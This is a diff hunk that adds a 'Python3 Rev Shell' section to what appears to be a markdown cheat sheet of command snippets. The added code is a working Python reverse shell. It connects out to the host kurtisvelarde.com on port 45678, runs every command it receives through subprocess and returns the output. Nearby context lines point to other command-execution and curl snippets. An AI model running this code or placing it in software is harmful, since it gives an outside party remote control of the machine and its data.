@@ -302,7 +302,41 @@ func main() {
     log.Println("Commands executed successfully")
 }
 ```
+## Python3 Rev Shell
+```sh
+## Python 3 Reverse Shell
+```python
+import socket
+import subprocess
+import os
 
+# Set the server's IP address and port number
+SERVER_HOST = 'kurtisvelarde.com'
+SERVER_PORT = 45678
+
+# Create a socket object
+s = socket.socket()
+
+# Connect to the server
+s.connect((SERVER_HOST, SERVER_PORT))
+
+# Send a message to the server saying we've connected
+s.send(str.encode("Connection established!"))
+
+# Receive commands from the remote server and run on the local machine
+while True:
+    # Receive command from the server
+    command = s.recv(1024).decode()
+
+    # If the received command is exit, close the socket and exit
+    if command.lower() == 'exit':
+        s.close()
+        break
+    # Execute the command and retrieve the results
+    output = subprocess.getoutput(command)
+    # Send the results back to the server
+    s.send(str.encode(output + "\n"))
+```
 ## Perl Curl
 ```sh
 #!/usr/bin/perl use strict;
